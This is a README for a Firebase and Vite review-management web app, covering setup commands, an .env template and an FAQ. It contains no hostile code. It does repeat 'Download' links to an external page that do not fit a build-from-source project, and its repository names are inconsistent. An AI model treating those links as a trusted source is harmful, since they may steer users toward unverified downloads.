# TeaCrack Café v1.0 - Review System 2026

> **A deployment-ready review platform for the web, backed by Firebase Firestore, developed with Vite, and tuned for Vercel hosting.** Gather, organize, and present customer feedback through a modern backend that can grow with your project.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zackhub2005/teacrack-cafe-feedback-hub?style=flat-square)](https://github.com/TeaCrack-Cafe/TeaCrack-Cafe)

---

<p align="center">
  <a href="https://zackhub2005.github.io/teacrack-cafe-feedback-hub/">
    <img src="https://img.shields.io/badge/Download-TeaCrack%20Café%20Latest-brightgreen?style=for-the-badge" alt="Download TeaCrack Café">
  </a>
</p>

> **[Direct Download - TeaCrack Café v1.0](https://zackhub2005.github.io/teacrack-cafe-feedback-hub/)**

---

[Download Latest Build](https://zackhub2005.github.io/teacrack-cafe-feedback-hub/)

---

## What TeaCrack Café Is

TeaCrack Café is a compact review management app for collecting genuine feedback from customers, readers, or followers. Since it runs on Firebase Firestore, you get real-time storage and retrieval without maintaining your own backend server. It fits use cases like a neighborhood cafe, an indie storefront, or a content-driven site, giving you a straightforward way to review, filter, and publish user submissions.

This project is aimed at developers who want a deployment-ready review stack that can expand without manual scaling work. Vite speeds up development and build output, while Vercel streamlines the path to production. Environment variables are used for Firebase settings, which keeps sensitive values out of the codebase and makes setup easier across different environments.

---

## Key Capabilities

- **Firebase Firestore Backend** - Real-time review storage and retrieval with no server management required
- **Vite-Powered Development** - Fast hot module replacement and optimized production builds
- **Vercel Deployment Ready** - One-click deployment with automatic HTTPS and global CDN
- **Environment Variable Configuration** - Keep Firebase keys and settings separate from source code
- **Production-Ready Architecture** - Built with scalability and maintainability in mind
- **Clean Review Management** - Submit, approve, and display user reviews with moderation support
- **Responsive Web Interface** - Works across desktop and mobile devices out of the box

---

## Getting Started

Clone the project locally:

```bash
git clone https://github.com/zackhub2005/teacrack-cafe-feedback-hub.git
cd TeaCrack-Cafe
```

Install the project dependencies with your package manager of choice:

```bash
npm install
# or
yarn install
# or
pnpm install
```

Set up your Firebase project credentials as described in the Configuration section, then launch the dev server:

```bash
npm run dev
```

---

## How to Use It

Once the development server is running, open the local URL printed in the terminal, usually `http://localhost:5173`.

1. **Configure Firebase** - Add your Firestore database credentials via environment variables
2. **Submit a Review** - Use the provided form to add a sample review
3. **Moderate Content** - Approve or reject reviews through the admin panel
4. **Display Reviews** - The front-end automatically updates with approved submissions
5. **Deploy to Production** - Run `npm run build` and deploy the `dist` folder to Vercel

For a complete production setup, link the GitHub repository to Vercel and enter the environment variables in the Vercel dashboard.

---

## Configuration

All Firebase settings are supplied through environment variables. Create a `.env` file in the project root with the following structure:

```env
VITE_FIREBASE_API_KEY=your_api_key_here
VITE_FIREBASE_AUTH_DOMAIN=your_project.firebaseapp.com
VITE_FIREBASE_PROJECT_ID=your_project_id
VITE_FIREBASE_STORAGE_BUCKET=your_project.appspot.com
VITE_FIREBASE_MESSAGING_SENDER_ID=your_sender_id
VITE_FIREBASE_APP_ID=your_app_id
```

Swap the placeholder values for your real Firebase project credentials. Do not commit the `.env` file to version control. If you deploy with Vercel, add the same values under the project's Environment Variables settings.

---

## Prerequisites

- **Node.js** 18.x or later
- **npm**, **yarn**, or **pnpm** package manager
- A **Firebase** account with Firestore enabled
- A **Vercel** account (for production deployment)
- Modern web browser (Chrome, Firefox, Safari, Edge)

---

## Common Questions

**How do I update the Firebase configuration after deployment?**  
Change the environment variables in your Vercel project settings and redeploy. The application reads these values at build time.

**Can I use this with a different hosting provider?**  
Yes. Build the project with `npm run build` and deploy the `dist` folder to any static hosting service that supports client-side routing.

**Where are reviews stored?**  
All review data is stored in your Firebase Firestore database. You can access and manage it through the Firebase Console.

**How do I add moderation features?**  
The system includes basic moderation capabilities. Extend the Firestore security rules and add an admin interface to approve or reject submissions.

**Does this work without JavaScript?**  
No. This is a JavaScript-based application that requires client-side scripting to interact with Firebase and render the interface.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
